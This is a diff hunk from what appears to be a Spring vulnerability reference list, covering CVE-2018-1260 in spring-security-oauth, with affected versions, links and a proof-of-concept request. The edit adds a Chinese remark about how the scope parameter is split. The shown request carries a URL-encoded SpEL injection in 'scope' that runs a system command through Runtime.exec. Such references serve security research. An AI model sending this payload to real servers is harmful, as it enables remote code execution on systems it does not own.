@@ -278,7 +278,7 @@ SpelView
 Affected Version: < 2.3.3 or 2.2.2 or 2.1.2 or 2.0.15  
 Ref: https://www.gosecure.net/blog/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/  
 Diff: https://github.com/spring-attic/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c  
-POC: 
+POC: (scope中如果存在空格，会被切分成数组)
 ```
 GET or POST
 /oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.baidu.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D
